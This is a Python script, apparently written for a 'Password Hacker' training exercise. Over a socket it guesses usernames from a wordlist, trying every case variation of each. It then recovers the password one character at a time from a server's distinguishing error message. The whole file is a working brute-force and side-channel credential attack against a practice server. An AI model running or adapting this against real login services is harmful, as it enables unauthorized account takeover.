import socket
import sys
import itertools
import string
import json

args = sys.argv
charset = string.ascii_lowercase + string.digits + string.ascii_uppercase

if len(args) == 3:
    address = (args[1], int(args[2]))
with socket.socket() as client_socket:
    client_socket.connect(address)

    with open("/Users/unicornhorn/PycharmProjects/Password Hacker/Password Hacker/task/hacking/login.txt", 'r') as f2:

        def new_login():
            for line in f2:
                yield line.strip()

        def login_variation(login):
            return map(''.join, itertools.product(*zip(login.upper(), login.lower())))

        def send_message_return_response(message, client):
            message = message.encode()
            client.send(message)
            response = client.recv(1024)
            decoded_response = response.decode()
            return decoded_response

        def into_json(login: str, password_text: str = " ") -> json:
            message_dict = {"login": login, "password": password_text}
            return json.dumps(message_dict)

        def main_response(json_response):
            str_json = json.loads(json_response)
            return str_json["result"]

        def find_login():
            login = None
            response = None
            while response != "Wrong password!":
                for log in new_login():
                    variations = login_variation(log)
                    for potential in variations:
                        potential_json = into_json(potential)
                        response = send_message_return_response(potential_json, client_socket)
                        response = main_response(response)
                        if response == "Wrong password!":
                            login = potential
                            response = "Wrong password!"
                            break
                    if login != None:
                        break
            if login != None:
                return login


        def generate_pass(base):
            for letter in charset:
                yield base + letter

        def find_password(login):
            final_pwd = ""
            response = None
            while response != "Connection success!":
                for password in generate_pass(final_pwd):
                    message = into_json(login, password)
                    response = send_message_return_response(message, client_socket)
                    reduced_response = main_response(response)
                    if reduced_response == "Connection success!":
                        return password
                    elif reduced_response == "Exception happened during login":
                        final_pwd = password
                        break

        login = find_login()
        password = find_password(login)
        print(into_json(login, password))




